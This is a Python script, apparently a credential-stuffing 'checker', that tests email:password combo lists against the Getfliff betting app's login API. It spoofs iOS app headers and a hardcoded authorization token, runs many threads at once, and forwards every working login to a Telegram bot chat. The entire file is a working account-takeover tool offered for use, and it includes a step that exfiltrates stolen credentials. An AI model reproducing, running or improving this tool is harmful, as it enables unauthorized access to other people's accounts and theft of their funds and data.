import requests
import threading
from tkinter import filedialog
from tkinter import *
from datetime import date
from time import sleep
import os
import re

# Assigning Variables
TotalCombos = 0
Checked = 0
Hits = 0
Custom = 0
Bad = 0
Retries = 0

checkerName = "Getfliff"
hitsFilename = "Getfliff Hits.txt"

# Functions

def saveHits(text, filename):
    file = open(filename, "a")
    file.write(text)
    file.close()

def clear():
    if os.name == 'nt':
        os.system('cls')
    else:
        os.system('clear')

def Banner():
    clear()
    print('''
    
                ░██████╗░███████╗████████╗███████╗██╗░░░░░██╗███████╗███████╗
                ██╔════╝░██╔════╝╚══██╔══╝██╔════╝██║░░░░░██║██╔════╝██╔════╝
                ██║░░██╗░█████╗░░░░░██║░░░█████╗░░██║░░░░░██║█████╗░░█████╗░░
                ██║░░╚██╗██╔══╝░░░░░██║░░░██╔══╝░░██║░░░░░██║██╔══╝░░██╔══╝░░
                ╚██████╔╝███████╗░░░██║░░░██║░░░░░███████╗██║██║░░░░░██║░░░░░
                ░╚═════╝░╚══════╝░░░╚═╝░░░╚═╝░░░░░╚══════╝╚═╝╚═╝░░░░░╚═╝░░░░░
    ''')
    print('\n                           [+] Developed By DE3P4K [+]\n')
    print('                              [+] t.me/DE3P4K07 [+]\n')

# def Stat():
#     print(f'Checked : {Checked}')
#     print(f'Hits    : {Hits}')
#     print(f'Custom  : {Custom}')
#     print(f'Bad     : {Bad}')

Banner()
while 1:
    tg = input('Send HITS to Telegram? [Y/N] : ')
    if tg == 'y' or tg == 'Y':
        tgbot = 1
        print("\n")
        bot_token = input('Enter Bot Token : ')
        chat_id = input('Enter Chat ID : ')
        break
    elif tg =='n' or tg == 'N':
        tgbot = 0
        break
    else:
        print('Bad Input !\n')
        continue

def Getfliff(combo):
    global Hits
    global Checked
    global Custom
    global Bad
    global Retries
    global hitsFilename

    try:
        email = combo.split(":")[0]
        password = combo.split(":")[1].replace('\n', '')
    except:
        Checked+=1
        Bad+=1
        return
    
    headers={
        'Host': 'm-c1.app.getfliff.com',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Accept-Encoding': 'gzip, deflate, br',
        'User-Agent': 'Fliff/298 CFNetwork/1335.0.3 Darwin/21.6.0',
        'Connection': 'keep-alive',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Authorization': 'Basic Y1pUcFhjNTIydmRjTGk5U1NMck5YQ1NPMFVPeHkwT0xYMjlub3ZZOTpJWm90Y3lseVM3NkZXTnJMc1ptN0tQMEtsd0xJbEdicGtRdVRTQ0xEblh6YklkRkdKMG1FUmE0cTJYNnVTSmRuOHZsSnBaNkRFWjZzSVAwZjFKMmw2NGpLZTh1VEQyQmtScHJUaVVCdmJpaFphRDU2QVE2TzVHeXpDcVVORm9sTA==',
        'x-dd-request-code': 'account_login',
        'Content-Length': '445'
    }

    data={f"grant_type=password&username=fliff_v2_auth&password=%7B%22login_data%22%3A%7B%22login_token%22%3A%22email%3A{email}%22%2C%22password%22%3A%22{password}%22%2C%22meta_device_os%22%3A%22ios%22%2C%22meta_app_version%22%3A%224.4%22%2C%22meta_app_build%22%3A158%2C%22meta_install_token%22%3A%22TvTOmmKX1l%22%2C%22meta_device_id%22%3A%22B7028A9E-04C0-4AFA-A86C-42159C5A8CC6%22%7D%2C%22__object_class_name%22%3A%22Fliff_Login_Request%22%7D"}

    try:
        response = requests.post("https://m-c1.app.getfliff.com/api/v1/oauth2/token/", headers=headers, json=data)
        print(response.text)
        if 'Invalid credentials given' in response.text:
            Checked+=1
            Bad+=1
            sleep(1)
        elif '{"access_token":"' in response.text:
            print(f"[VALID] {email}:{password}")
            if tgbot == 1:
                message = f"[Getfliff]\n➖➖➖➖➖➖➖➖➖➖➖➖➖\n{email} : {password}\n➖➖➖➖➖➖➖➖➖➖➖➖➖\nChecker by @DE3P4K07"
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
                requests.get(url).json()
        else:
            sleep(1)
    except:
        sleep(1)

clear()
# ctypes.windll.kernel32.SetConsoleTitleW(f"{checkerName} Checker | Load Combos | By DE3P4K")
Banner()
print("[+] Select Combo :")
root = Tk()
root.withdraw()
name=filedialog.askopenfilename(initialdir = "/",title = "Select a File", filetypes = (("Text files", "*.txt*"), ("all files", "*.*"))) #File Dialog
root.destroy()
file=open(name,"r",errors="ignore")
combosfile=file.readlines()
combofilename = os.path.basename(name)
TotalCombos = len(combosfile)
sleep(2)
clear()
Banner()
threads = []
clear()
# ctypes.windll.kernel32.SetConsoleTitleW(f"{checkerName} - Threads Starting | By DE3P4K")
Banner()
print(f'Loaded {combofilename} with {TotalCombos} Lines\n\n')

for combo in combosfile: #Check Each Combo in the File (It does use up a lot of ram tho..)
    t = threading.Thread(target=Getfliff, args=(combo,))
    t.start()
    threads.append(t)
    
for thread in threads:
    thread.join()
    
print("\n[+] Task Completed!")
print("[+] Hits : "+ str(Hits))
input("[+] Press Enter to Exit.\n")